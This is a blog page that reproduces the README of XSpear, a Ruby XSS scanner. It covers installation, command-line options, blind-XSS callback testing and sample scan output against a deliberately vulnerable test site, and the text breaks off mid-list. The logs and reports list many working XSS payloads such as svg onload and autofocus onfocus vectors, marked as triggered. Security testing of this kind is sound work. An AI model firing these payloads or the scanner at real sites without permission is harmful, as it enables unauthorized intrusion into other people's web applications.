@@ -1,0 +1,541 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>XSPear : Powerfull XSS Scanning and Parameter analysis tool&amp;gem | Posts</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.17.1/styles/railscasts.css">
+    <link rel="stylesheet" href="/lightx.css"/>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon512.png">
+    <meta name="theme-color" content="#ffffff"/>
+    
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body>
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function () {
+          navigator.serviceWorker.register('/sw.js', {scope: '/'})
+            .then(function (registration) {
+              // console.log('ServiceWorker registration successful with scope: ', registration.scope);
+            })
+            .catch(function (err) {
+              console.log('ServiceWorker registration failed: ', err);
+            });
+        });
+      }
+    </script>
+  <div id="page-container">
+    <div id="content-wrap">
+      <div class="wrapper">
+        <div class="container">
+            <nav>
+    <ul>
+      <li><a href="/">Posts</a></li>
+      <li><a href="/archives">Archives</a></li>
+      <li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+            <article>
+  <h1>XSPear : Powerfull XSS Scanning and Parameter analysis tool&gem</h1>
+  <div class="contents">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#README-md"><span class="toc-text">README.md</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSpear"><span class="toc-text">XSpear</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TOC"><span class="toc-text">TOC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-features"><span class="toc-text">Key features</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dependency-gems"><span class="toc-text">Dependency gems</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Usage-on-cli"><span class="toc-text">Usage on cli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Result-types"><span class="toc-text">Result types</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Verbose-Mode"><span class="toc-text">Verbose Mode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Case-by-Case"><span class="toc-text">Case by Case</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sample-log"><span class="toc-text">Sample log</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Usage-on-ruby-code"><span class="toc-text">Usage on ruby code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Add-Scanning-Module"><span class="toc-text">Add Scanning Module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Update"><span class="toc-text">Update</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RubyDoc"><span class="toc-text">RubyDoc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Development"><span class="toc-text">Development</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Contributing"><span class="toc-text">Contributing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donate"><span class="toc-text">Donate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#License"><span class="toc-text">License</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-of-Conduct"><span class="toc-text">Code of Conduct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ScreenShot"><span class="toc-text">ScreenShot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Video"><span class="toc-text">Video</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Repo"><span class="toc-text">Repo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Teching-Video"><span class="toc-text">Teching Video</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Frequent-Issues"><span class="toc-text">Frequent Issues</span></a></li></ol>
+  </div>
+  <h1 id="README-md"><a href="#README-md" class="headerlink" title="README.md"></a><code>README.md</code></h1><img src="https://user-images.githubusercontent.com/13212227/62058818-ffcef780-b25c-11e9-9a35-36537efbcca7.png" width="100%">
+
+<h1 id="XSpear"><a href="#XSpear" class="headerlink" title="XSpear"></a>XSpear</h1><p>XSpear is XSS Scanner on ruby gems</p>
+<p><img src="https://img.shields.io/github/languages/top/hahwul/xspear?color=red"> <img src="https://img.shields.io/gem/v/XSpear.svg"> <img src="https://img.shields.io/gem/dt/XSpear.svg"> <img src="https://img.shields.io/librariesio/sourcerank/rubygems/Xspear"> <img src="https://api.codacy.com/project/badge/Grade/0fa0f7cd75e34e7b9800f4fdf147605e"> <img src="https://img.shields.io/github/license/hahwul/XSpear.svg"> <a href="https://twitter.com/intent/follow?screen_name=hahwul" target="_blank" rel="noopener"><img src="https://img.shields.io/twitter/follow/hahwul?style=flat-square"></a></p>
+<h2 id="TOC"><a href="#TOC" class="headerlink" title="TOC"></a>TOC</h2><ul>
+<li><a href="#readmemd"><code>README.md</code></a></li>
+<li><a href="#xspear">XSpear</a><ul>
+<li><a href="#toc">TOC</a></li>
+<li><a href="#key-features">Key features</a></li>
+<li><a href="#installation">Installation</a><ul>
+<li><a href="#dependency-gems">Dependency gems</a></li>
+</ul>
+</li>
+<li><a href="#usage-on-cli">Usage on cli</a><ul>
+<li><a href="#result-types">Result types</a></li>
+<li><a href="#verbose-mode">Verbose Mode</a></li>
+<li><a href="#case-by-case">Case by Case</a></li>
+<li><a href="#sample-log">Sample log</a></li>
+</ul>
+</li>
+<li><a href="#usage-on-ruby-code">Usage on ruby code</a></li>
+<li><a href="#add-scanning-module">Add Scanning Module</a></li>
+<li><a href="#update">Update</a></li>
+<li><a href="#rubydoc">RubyDoc</a></li>
+<li><a href="#development">Development</a></li>
+<li><a href="#contributing">Contributing</a></li>
+<li><a href="#donate">Donate</a></li>
+<li><a href="#license">License</a></li>
+<li><a href="#code-of-conduct">Code of Conduct</a></li>
+<li><a href="#screenshot">ScreenShot</a></li>
+<li><a href="#video">Video</a></li>
+</ul>
+</li>
+<li><a href="#repo"><code>Repo</code></a></li>
+<li><a href="#teching-video"><code>Teching Video</code></a></li>
+<li><a href="#frequent-issues"><code>Frequent Issues</code></a></li>
+</ul>
+<h2 id="Key-features"><a href="#Key-features" class="headerlink" title="Key features"></a>Key features</h2><ul>
+<li>Pattern matching based XSS scanning</li>
+<li>Detect <code>alert</code> <code>confirm</code> <code>prompt</code> event on headless browser (with Selenium)</li>
+<li>Testing request/response for XSS protection bypass and reflected(or all) params<br><ul>
+<li>Reflected Params</li>
+<li>All params(for blind xss, anytings)</li>
+<li>Filtered test <code>event handler</code> <code>HTML tag</code> <code>Special Char</code> <code>Useful code</code></li>
+<li>Testing custom payload for only you!</li>
+</ul>
+</li>
+<li>Testing Blind XSS (with XSS Hunter , ezXSS, HBXSS, Etc all url base blind test…)</li>
+<li>Dynamic/Static Analysis<ul>
+<li>Find SQL Error pattern</li>
+<li>Analysis Security headers(<code>CSP</code> <code>HSTS</code> <code>X-frame-options</code>, <code>XSS-protection</code> etc.. )</li>
+<li>Analysis Other headers..(Server version, Content-Type, etc…)</li>
+<li>XSS Testing to URI Path</li>
+<li>Testing Only Parameter Analysis (aka no-XSS mode)</li>
+</ul>
+</li>
+<li>Scanning from Raw file(Burp suite, ZAP Request)</li>
+<li>XSpear running on ruby code(with Gem library)</li>
+<li>Show <code>table base cli-report</code> and <code>filtered rule</code>, <code>testing raw query</code>(url)</li>
+<li>Testing at selected parameters</li>
+<li>Support output format <code>cli</code> <code>json</code> <code>html</code><ul>
+<li>cli</li>
+<li>json</li>
+<li>html</li>
+</ul>
+</li>
+<li>Support Verbose level (0~3)<ul>
+<li>0: quite mode(only result)</li>
+<li>1: show scanning status(default)</li>
+<li>2: show scanning logs</li>
+<li>3: show detail log(req/res)</li>
+</ul>
+</li>
+<li>Support custom callback code to any test various attack vectors</li>
+<li>Support Config file</li>
+</ul>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Install it yourself as:</p>
+<pre><code>$ gem install XSpear</code></pre><p>Or install it yourself as (local file / download <a href="https://github.com/hahwul/XSpear/releases/latest" target="_blank" rel="noopener">latest</a> ):</p>
+<pre><code>$ gem install XSpear-{version}.gem</code></pre><p>Add this line to your application’s Gemfile:</p>
+<pre><code class="ruby">gem &#39;XSpear&#39;</code></pre>
+<p>And then execute:</p>
+<pre><code>$ bundle</code></pre><h3 id="Dependency-gems"><a href="#Dependency-gems" class="headerlink" title="Dependency gems"></a>Dependency gems</h3><p><code>colorize</code> <code>selenium-webdriver</code> <code>terminal-table</code> <code>progress_bar</code><br><br>If you configured it to install automatically in the Gem library, but it behaves abnormally, install it with the following command.</p>
+<pre><code>$ gem install colorize
+$ gem install selenium-webdriver
+$ gem install terminal-table
+$ gem install progress_bar</code></pre><h2 id="Usage-on-cli"><a href="#Usage-on-cli" class="headerlink" title="Usage on cli"></a>Usage on cli</h2><pre><code>Usage: xspear -u [target] -[options] [value]
+[ e.g ]
+$ xspear -u &#39;https://www.hahwul.com/?q=123&#39; --cookie=&#39;role=admin&#39; -v 1 -a 
+$ xspear -u &#39;http://testphp.vulnweb.com/listproducts.php?cat=123&#39; -v 2
+$ xspear -u &#39;http://testphp.vulnweb.com/listproducts.php?cat=123&#39; -v 0 -o json
+
+[ Options ]
+    -u, --url=target_URL             [required] Target Url
+    -d, --data=POST Body             [optional] POST Method Body data
+    -a, --test-all-params            [optional] test to all params(include not reflected)
+        --no-xss                     [optional] no testing xss, only parameters analysis
+        --headers=HEADERS            [optional] Add HTTP Headers
+        --cookie=COOKIE              [optional] Add Cookie
+        --custom-payload=FILENAME    [optional] Load custom payload json file
+        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
+    -p, --param=PARAM                [optional] Test paramters
+    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
+                                      + with XSS Hunter, ezXSS, HBXSS, etc...
+                                      + e.g : -b https://hahwul.xss.ht
+    -t, --threads=NUMBER             [optional] thread , default: 10
+    -o, --output=FORMAT              [optional] Output format (cli , json)
+    -c, --config=FILENAME            [optional] Using config.json
+    -v, --verbose=0~3                [optional] Show log depth
+                                      + v=0 : quite mode(only result)
+                                      + v=1 : show scanning status(default)
+                                      + v=2 : show scanning logs
+                                      + v=3 : show detail log(req/res)
+    -h, --help                       Prints this help
+        --version                    Show XSpear version
+        --update                     Show how to update
+
+</code></pre><h3 id="Result-types"><a href="#Result-types" class="headerlink" title="Result types"></a>Result types</h3><ul>
+<li>(I)NFO: Get information ( e.g sql error , filterd rule, reflected params, etc..)</li>
+<li>(V)UNL: Vulnerable XSS, Checked alert/prompt/confirm with Selenium</li>
+<li>(L)OW: Low level issue</li>
+<li>(M)EDIUM: medium level issue</li>
+<li>(H)IGH: high level issue</li>
+</ul>
+<h3 id="Verbose-Mode"><a href="#Verbose-Mode" class="headerlink" title="Verbose Mode"></a>Verbose Mode</h3><p><strong>[0] quite mode(show only result)</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&quot; -v 0
+you see report</code></pre><p><strong>[1] show progress bar (default)</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&quot; -v 1
+[*] analysis request..
+[*] used test-reflected-params mode(default)
+[*] creating a test query [for reflected 2 param + blind XSS ]
+[*] test query generation is complete. [249 query]
+[*] starting XSS Scanning. [10 threads]
+
+[#######################################] [249/249] [100.00%] [01:05] [00:00] [  3.83/s]
+...
+you see report</code></pre><p><strong>[2] show scanning logs</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&quot; -v 2
+[*] analysis request..
+[I] [22:42:41] [200/OK] [param: cat][Found SQL Error Pattern]
+[-] [22:42:41] [200/OK] &#39;STATIC&#39; not reflected
+[-] [22:42:41] [200/OK] &#39;cat&#39; not reflected &lt;script&gt;alert(45)&lt;/script&gt;
+[I] [22:42:41] [200/OK] reflected rEfe6[param: cat][reflected parameter]
+[*] used test-reflected-params mode(default)
+[*] creating a test query [for reflected 2 param + blind XSS ]
+[*] test query generation is complete. [249 query]
+[*] starting XSS Scanning. [10 threads]
+[I] [22:42:43] [200/OK] reflected onhwul=64[param: cat][reflected EHon{any} pattern]
+[-] [22:42:54] [200/OK] &#39;cat&#39; not reflected &lt;img/src onerror=alert(45)&gt;
+[-] [22:42:54] [200/OK] &#39;cat&#39; not reflected &lt;svg/onload=alert(45)&gt;
+[H] [22:42:54] [200/OK] reflected &lt;script&gt;alert(45)&lt;/script&gt;[param: cat][reflected XSS Code]
+[V] [22:42:59] [200/OK] found alert/prompt/confirm (45) in selenium!! &#39;&quot;&gt;&lt;svg/onload=alert(45)&gt;[param: cat][triggered &lt;svg/onload=alert(45)&gt;]
+...
+you see report</code></pre><p><strong>[3] show scanning detail logs</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&quot; -v 3
+[*] analysis request..
+[-] [22:56:21] [200/OK] http://testphp.vulnweb.com/listproducts.php?cat=123 in url
+[ Request ]
+{&quot;accept-encoding&quot;=&gt;[&quot;gzip;q=1.0,deflate;q=0.6,identity;q=0.3&quot;], &quot;accept&quot;=&gt;[&quot;*/*&quot;], &quot;user-agent&quot;=&gt;[&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;], &quot;connection&quot;=&gt;[&quot;keep-alive&quot;], &quot;host&quot;=&gt;[&quot;testphp.vulnweb.com&quot;]}
+[ Response ]
+{&quot;server&quot;=&gt;[&quot;nginx/1.4.1&quot;], &quot;date&quot;=&gt;[&quot;Sun, 29 Dec 2019 13:53:23 GMT&quot;], &quot;content-type&quot;=&gt;[&quot;text/html&quot;], &quot;transfer-encoding&quot;=&gt;[&quot;chunked&quot;], &quot;connection&quot;=&gt;[&quot;keep-alive&quot;], &quot;x-powered-by&quot;=&gt;[&quot;PHP/5.3.10-1~lucid+2uwsgi2&quot;]}
+[-] [22:56:21] [200/OK] &#39;STATIC&#39; not reflected
+[-] [22:56:21] [200/OK] cat=123rEfe6 in url
+...
+[*] used test-reflected-params mode(default)
+[*] creating a test query [for reflected 2 param + blind XSS ]
+[*] test query generation is complete. [249 query]
+[*] starting XSS Scanning. [10 threads]
+...
+[ Request ]
+{&quot;accept-encoding&quot;=&gt;[&quot;gzip;q=1.0,deflate;q=0.6,identity;q=0.3&quot;], &quot;accept&quot;=&gt;[&quot;*/*&quot;], &quot;user-agent&quot;=&gt;[&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;], &quot;connection&quot;=&gt;[&quot;keep-alive&quot;], &quot;host&quot;=&gt;[&quot;testphp.vulnweb.com&quot;]}
+[ Response ]
+{&quot;server&quot;=&gt;[&quot;nginx/1.4.1&quot;], &quot;date&quot;=&gt;[&quot;Sun, 29 Dec 2019 13:54:36 GMT&quot;], &quot;content-type&quot;=&gt;[&quot;text/html&quot;], &quot;transfer-encoding&quot;=&gt;[&quot;chunked&quot;], &quot;connection&quot;=&gt;[&quot;keep-alive&quot;], &quot;x-powered-by&quot;=&gt;[&quot;PHP/5.3.10-1~lucid+2uwsgi2&quot;]}
+[H] [22:57:33] [200/OK] reflected &lt;keygen autofocus onfocus=alert(45)&gt;[param: cat][reflected onfocus XSS Code]
+...
+you see report</code></pre><h3 id="Case-by-Case"><a href="#Case-by-Case" class="headerlink" title="Case by Case"></a>Case by Case</h3><p><strong>Scanning XSS</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&quot; -d &quot;searchFor=yy&quot;</code></pre><p><strong>Only JSON output</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&quot; -d &quot;searchFor=yy&quot; -o json -v 0</code></pre><p><strong>Set scanning thread</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&quot; -t 30</code></pre><p><strong>Testing at selected parameters</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&amp;cat=123&amp;ppl=1fhhahwul&quot; -p cat,test</code></pre><p><strong>Testing at all parameters</strong><br><br>(This option is tested with or without reflection.)</p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&amp;cat=123&amp;ppl=1fhhahwul&quot; -a</code></pre><p><strong>Testing Only parameter analysis (aka no-xss mode)</strong><br></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&amp;cat=123&amp;ppl=1fhhahwul&quot; --no-xss</code></pre><p><strong>Testing blind xss(all params)</strong><br><br>(Should be used as much as possible because Blind XSS is everywhere)<br></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/search.php?test=query&quot; -b &quot;https://hahwul.xss.ht&quot; -a
+
+# Set your blind xss host. &lt;-b options&gt;</code></pre><p><strong>Testing custom payload</strong><br></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&quot; --custom-payload=custom_payload.json </code></pre><p>in custom_payload.json file</p>
+<pre><code class="json">[
+  {
+    &quot;payload&quot;:&quot;&lt;svg/onload=alert(1)&gt;&quot;,
+    &quot;callback&quot;:&quot;P1&quot;,
+    &quot;descript&quot;:&quot;blahblah~&quot;
+  },
+  {
+    &quot;payload&quot;:&quot;&lt;svg/onload=alert(1)&gt;&quot;,
+    &quot;callback&quot;:&quot;P2&quot;,
+    &quot;descript&quot;:&quot;blahblah~&quot;
+  },
+  {
+    &quot;payload&quot;:&quot;&lt;&gt;&quot;,
+    &quot;callback&quot;:&quot;P1&quot;,
+    &quot;descript&quot;:&quot;blahblah~&quot;
+  }
+]</code></pre>
+<p><strong>for Pipeline</strong><br></p>
+<pre><code>$ xspear -u {target} -b &quot;your-blind-xss-host&quot; -a -v 0 -o json
+
+# -u : target 
+# -b : testing blind xss
+# -a : test all params(test to not reflected param)
+# -v : verbose, not showing logs at value 1.
+# -o : output optios, json!</code></pre><p>result json data</p>
+<pre><code>{
+    &quot;starttime&quot;: &quot;2019-12-25 00:02:58 +0900&quot;,
+    &quot;endtime&quot;: &quot;2019-12-25 00:03:31 +0900&quot;,
+    &quot;issue_count&quot;: 25,
+    &quot;issue_list&quot;: [{
+        &quot;id&quot;: 0,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;DYNAMIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;XsPeaR\&quot;&quot;,
+        &quot;description&quot;: &quot;Found SQL Error Pattern&quot;
+    }, {
+        &quot;id&quot;: 1,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;STATIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;-&quot;,
+        &quot;payload&quot;: &quot;&lt;original query&gt;&quot;,
+        &quot;description&quot;: &quot;Found Server: nginx/1.4.1&quot;
+    }, {
+        &quot;id&quot;: 2,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;STATIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;-&quot;,
+        &quot;payload&quot;: &quot;&lt;original query&gt;&quot;,
+        &quot;description&quot;: &quot;Not set HSTS&quot;
+    }, {
+        &quot;id&quot;: 3,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;STATIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;-&quot;,
+        &quot;payload&quot;: &quot;&lt;original query&gt;&quot;,
+        &quot;description&quot;: &quot;Content-Type: text/html&quot;
+    }, {
+        &quot;id&quot;: 4,
+        &quot;type&quot;: &quot;LOW&quot;,
+        &quot;issue&quot;: &quot;STATIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;-&quot;,
+        &quot;payload&quot;: &quot;&lt;original query&gt;&quot;,
+        &quot;description&quot;: &quot;Not Set X-Frame-Options&quot;
+    }, {
+        &quot;id&quot;: 5,
+        &quot;type&quot;: &quot;MIDUM&quot;,
+        &quot;issue&quot;: &quot;STATIC ANALYSIS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;-&quot;,
+        &quot;payload&quot;: &quot;&lt;original query&gt;&quot;,
+        &quot;description&quot;: &quot;Not Set CSP&quot;
+    }, {
+        &quot;id&quot;: 6,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;REFLECTED&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;rEfe6&quot;,
+        &quot;description&quot;: &quot;reflected parameter&quot;
+    }, {
+        &quot;id&quot;: 7,
+        &quot;type&quot;: &quot;INFO&quot;,
+        &quot;issue&quot;: &quot;FILERD RULE&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;onhwul=64&quot;,
+        &quot;description&quot;: &quot;not filtered event handler on{any} pattern&quot;
+    }
+....
+, {
+        &quot;id&quot;: 17,
+        &quot;type&quot;: &quot;HIGH&quot;,
+        &quot;issue&quot;: &quot;XSS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;&lt;audio src onloadstart=alert(45)&gt;&quot;,
+        &quot;description&quot;: &quot;reflected HTML5 XSS Code&quot;
+    }, {
+        &quot;id&quot;: 18,
+        &quot;type&quot;: &quot;HIGH&quot;,
+        &quot;issue&quot;: &quot;XSS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;&lt;keygen autofocus onfocus=alert(45)&gt;&quot;,
+        &quot;description&quot;: &quot;reflected onfocus XSS Code&quot;
+ ....
+    }, {
+        &quot;id&quot;: 24,
+        &quot;type&quot;: &quot;HIGH&quot;,
+        &quot;issue&quot;: &quot;XSS&quot;,
+        &quot;method&quot;: &quot;GET&quot;,
+        &quot;param&quot;: &quot;cat&quot;,
+        &quot;payload&quot;: &quot;&lt;marquee onstart=alert(45)&gt;&quot;,
+        &quot;description&quot;: &quot;triggered &lt;marquee onstart=alert(45)&gt;&quot;
+    }]
+}</code></pre><p>(Items marked as <code>triggered</code> are actually payloads that work in the browser.)</p>
+<p><strong>XSpear on Burpsuite</strong><br><br><a href="https://github.com/hahwul/XSpear/tree/master/forBurp" target="_blank" rel="noopener">https://github.com/hahwul/XSpear/tree/master/forBurp</a></p>
+<p>etc…</p>
+<h3 id="Sample-log"><a href="#Sample-log" class="headerlink" title="Sample log"></a>Sample log</h3><p><strong>Scanning XSS</strong></p>
+<pre><code>xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=z&quot;
+    )  (
+ ( /(  )\ )
+ )\())(()/(          (     )  (
+((_)\  /(_))`  )    ))\ ( /(  )(
+__((_)(_))  /(/(   /((_))(_))(()\
+\ \/ // __|((_)_\ (_)) ((_)_  ((_)
+ &gt;  &lt; \__ \| &#39;_ \)/ -_)/ _` || &#39;_|
+/_/\_\|___/| .__/ \___|\__,_||_|    /&gt;
+           |_|                   \ /&lt;
+{\\\\\\\\\\\\\BYHAHWUL\\\\\\\\\\\(0):::&lt;======================-
+                                 / \&lt;
+                                    \&gt;       [ v1.4.0 ]
+[*] analysis request..
+[*] used test-reflected-params mode(default)
+[*] creating a test query [for reflected 1 param ]
+[*] test query generation is complete. [251 query]
+[*] starting XSS Scanning. [10 threads]
+...snip...
+[*] finish scan. the report is being generated..
++----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
+|                                                            [ XSpear report ]                                                            |
+|                              http://testphp.vulnweb.com/listproducts.php?cat=123&amp;zfdfasdf=124fff... (snip)                              |
+|                                 2019-08-14 23:50:34 +0900 ~ 2019-08-14 23:51:07 +0900 Found 24 issues.                                  |
++----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
+| NO | TYPE  | ISSUE            | METHOD | PARAM | PAYLOAD                                | DESCRIPTION                                   |
++----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
+| 0  | INFO  | STATIC ANALYSIS  | GET    | -     | &lt;original query&gt;                       | Found Server: nginx/1.4.1                     |
+| 1  | INFO  | STATIC ANALYSIS  | GET    | -     | &lt;original query&gt;                       | Not set HSTS                                  |
+| 2  | INFO  | STATIC ANALYSIS  | GET    | -     | &lt;original query&gt;                       | Content-Type: text/html                       |
+| 3  | LOW   | STATIC ANALYSIS  | GET    | -     | &lt;original query&gt;                       | Not Set X-Frame-Options                       |
+| 4  | MIDUM | STATIC ANALYSIS  | GET    | -     | &lt;original query&gt;                       | Not Set CSP                                   |
+| 5  | INFO  | DYNAMIC ANALYSIS | GET    | cat   | XsPeaR&quot;                                | Found SQL Error Pattern                       |
+| 6  | INFO  | REFLECTED        | GET    | cat   | rEfe6                                  | reflected parameter                           |
+| 7  | INFO  | FILERD RULE      | GET    | cat   | onhwul=64                              | not filtered event handler on{any} pattern    |
+| 8  | HIGH  | XSS              | GET    | cat   | &lt;script&gt;alert(45)&lt;/script&gt;             | reflected XSS Code                            |
+| 9  | HIGH  | XSS              | GET    | cat   | &lt;marquee onstart=alert(45)&gt;            | reflected HTML5 XSS Code                      |
+| 10 | HIGH  | XSS              | GET    | cat   | &lt;details/open/ontoggle=&quot;alert`45`&quot;&gt;    | reflected HTML5 XSS Code                      |
+| 11 | HIGH  | XSS              | GET    | cat   | &lt;select autofocus onfocus=alert(45)&gt;   | reflected onfocus XSS Code                    |
+| 12 | HIGH  | XSS              | GET    | cat   | &lt;input autofocus onfocus=alert(45)&gt;    | reflected onfocus XSS Code                    |
+| 13 | HIGH  | XSS              | GET    | cat   | &lt;textarea autofocus onfocus=alert(45)&gt; | reflected onfocus XSS Code                    |
+| 14 | HIGH  | XSS              | GET    | cat   | &lt;audio src onloadstart=alert(45)&gt;      | reflected HTML5 XSS Code                      |
+| 15 | HIGH  | XSS              | GET    | cat   | &lt;meter onmouseover=alert(45)&gt;0&lt;/meter&gt; | reflected HTML5 XSS Code                      |
+| 16 | HIGH  | XSS              | GET    | cat   | &quot;&gt;&lt;iframe/src=JavaScriPt:alert(45)&gt;    | reflected XSS Code                            |
+| 17 | HIGH  | XSS              | GET    | cat   | &lt;video/poster/onerror=alert(45)&gt;       | reflected HTML5 XSS Code                      |
+| 18 | HIGH  | XSS              | GET    | cat   | &lt;keygen autofocus onfocus=alert(45)&gt;   | reflected onfocus XSS Code                    |
+| 19 | VULN  | XSS              | GET    | cat   | &lt;script&gt;alert(45)&lt;/script&gt;             | triggered &lt;script&gt;alert(45)&lt;/script&gt;          |
+| 20 | HIGH  | XSS              | GET    | cat   | &lt;marquee onstart=alert(45)&gt;            | triggered &lt;marquee onstart=alert(45)&gt;         |
+| 21 | HIGH  | XSS              | GET    | cat   | &lt;details/open/ontoggle=&quot;alert(45)&quot;&gt;    | triggered &lt;details/open/ontoggle=&quot;alert(45)&quot;&gt; |
+| 22 | HIGH  | XSS              | GET    | cat   | &lt;audio src onloadstart=alert(45)&gt;      | triggered &lt;audio src onloadstart=alert(45)&gt;   |
+| 23 | VULN  | XSS              | GET    | cat   | &#39;&quot;&gt;&lt;svg/onload=alert(45)&gt;              | triggered &lt;svg/onload=alert(45)&gt;              |
++----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
+&lt; Available Objects &gt;
+[cat] param
+ + Available Special Char: ` ( \ &#39; { ) } [ : $ ]
+ + Available Event Handler: &quot;onBeforeEditFocus&quot;,&quot;onAbort&quot;,&quot;onActivate&quot;,&quot;onAfterUpdate&quot;,&quot;onBeforeCopy&quot;,&quot;onAfterPrint&quot;,&quot;onBeforeActivate&quot;,&quot;onBeforeCut&quot;,&quot;onBeforeDeactivate&quot;,&quot;onChange&quot;,&quot;onBeforePrint&quot;,&quot;onBounce&quot;,&quot;onBeforeUnload&quot;,&quot;onCellChange&quot;,&quot;onBeforePaste&quot;,&quot;onClick&quot;,&quot;onBegin&quot;,&quot;onBlur&quot;,&quot;onBeforeUpdate&quot;,&quot;onDataSetChanged&quot;,&quot;onCut&quot;,&quot;onDblClick&quot;,&quot;onCopy&quot;,&quot;onContextMenu&quot;,&quot;onDataSetComplete&quot;,&quot;onDeactivate&quot;,&quot;onDataAvailable&quot;,&quot;onControlSelect&quot;,&quot;onDrag&quot;,&quot;onDrop&quot;,&quot;onDragEnd&quot;,&quot;onEnd&quot;,&quot;onDragLeave&quot;,&quot;onDragStart&quot;,&quot;onDragOver&quot;,&quot;onDragEnter&quot;,&quot;onDragDrop&quot;,&quot;onError&quot;,&quot;onErrorUpdate&quot;,&quot;onFinish&quot;,&quot;onFilterChange&quot;,&quot;onKeyPress&quot;,&quot;onHelp&quot;,&quot;onFocus&quot;,&quot;onInput&quot;,&quot;onHashChange&quot;,&quot;onKeyDown&quot;,&quot;onFocusIn&quot;,&quot;onFocusOut&quot;,&quot;onMessage&quot;,&quot;onMouseDown&quot;,&quot;onLoad&quot;,&quot;onLayoutComplete&quot;,&quot;onMouseEnter&quot;,&quot;onLoseCapture&quot;,&quot;onloadstart&quot;,&quot;onMediaError&quot;,&